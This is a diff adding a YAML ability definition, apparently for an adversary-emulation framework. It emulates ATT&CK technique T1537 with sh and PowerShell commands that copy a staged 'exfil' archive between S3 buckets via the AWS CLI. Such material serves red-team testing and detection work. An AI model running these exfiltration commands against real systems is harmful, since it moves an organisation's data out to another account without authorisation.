@@ -1,0 +1,26 @@
+- id: ba0deadb-97ac-4a4c-aa81-21912fc90980
+  name: Transfer Compressed Archive to Separate S3 Bucket via AWS CLI
+  description: |
+    Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper
+    policies and security rules are in place to allow reading from the source bucket and writing to the destination
+    bucket.
+  tactic: exfiltration
+  technique:
+    attack_id: T1537
+    name: 'Transfer Data to Cloud Account'
+  platforms:
+    linux:
+      sh:
+        command: |
+          LocalFile='#{host.dir.compress}';
+          RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+          aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
+    windows:
+      psh:
+        command: |
+          $SourceFile = (Get-Item #{host.dir.compress});
+          $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+          aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.dir.compress
